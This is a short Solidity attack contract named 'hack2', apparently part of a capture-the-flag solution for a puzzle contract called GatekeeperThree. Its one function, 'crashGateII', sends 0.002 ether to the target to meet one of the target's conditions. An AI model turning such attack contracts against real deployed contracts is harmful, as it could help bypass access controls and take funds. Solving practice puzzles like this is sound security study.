// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface I2GatekeeperThree{
    function construct0r() external;
}
contract hack2{
 I2GatekeeperThree public gatekeeper3;
 constructor(address _gatekeeerAddr)payable{
   gatekeeper3=I2GatekeeperThree(_gatekeeerAddr);
 }

function crashGateII()external payable{
   (bool success,)= address(gatekeeper3).call{value:0.002 ether}("");
   require(success,"Cant crash!");
}


}